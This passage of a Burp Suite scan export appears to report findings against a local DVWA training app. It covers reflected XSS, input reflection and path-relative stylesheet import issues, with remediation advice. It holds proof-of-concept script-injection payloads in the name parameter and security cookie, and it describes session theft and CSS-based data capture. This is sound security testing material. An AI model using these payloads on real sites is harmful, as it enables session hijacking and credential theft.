        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>name</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>mw0ga&lt;script&gt;alert(1)&lt;/script&gt;sed50</b> was submitted in the name parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "56": {
        "\ufeffissue__serialNumber": "2.73825E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_r/",
        "issue__location": "/dvwa/vulnerabilities/xss_r/ [name parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>name</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "57": {
        "\ufeffissue__serialNumber": "8.0486E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_r/",
        "issue__location": "/dvwa/vulnerabilities/xss_r/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "58": {
        "\ufeffissue__serialNumber": "7.34074E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_r/",
        "issue__location": "/dvwa/vulnerabilities/xss_r/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>kforz'&gt;&lt;script&gt;alert(1)&lt;/script&gt;r5nr7</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "59": {
        "\ufeffissue__serialNumber": "4.21206E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_r/",
        "issue__location": "/dvwa/vulnerabilities/xss_r/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "60": {
        "\ufeffissue__serialNumber": "7.39171E+17",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/captcha/",
        "issue__location": "/dvwa/vulnerabilities/captcha/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
